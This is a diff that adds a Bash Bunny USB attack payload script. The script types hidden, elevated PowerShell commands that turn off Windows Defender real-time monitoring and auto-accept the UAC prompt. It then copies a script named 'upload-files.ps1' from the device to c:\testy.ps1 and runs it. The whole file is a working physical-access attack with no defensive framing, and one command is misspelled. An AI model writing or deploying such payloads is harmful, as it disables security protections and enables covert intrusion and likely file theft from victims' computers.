@@ -1,0 +1,23 @@
+# System default payload
+LED R SLOW
+ATTACKMODE HID
+QUCK DELAY 2000
+RUN WIN powershell -windowstyle hidden Start-Process powershell -Verb runAs -argument "'-windowstyle hidden -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring 1;'"
+
+QUACK DELAY 1000
+QUACK ALT y
+
+LED ATTACK
+ATTACKMODE HID STORAGE
+QUACK DELAY 900
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -windowstyle hidden Start-Process powershell -Verb runAs -argument " \"\"\"-windowstyle hidden -Command cp ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\upload-files.ps1') c:\testy.ps1;\"\"\",\"\"\"c:\testy.ps1;\"\"\" "
+QUACK DELAY 1000
+QUACK ALT y
+
+
+
+LED FINISH
+
+
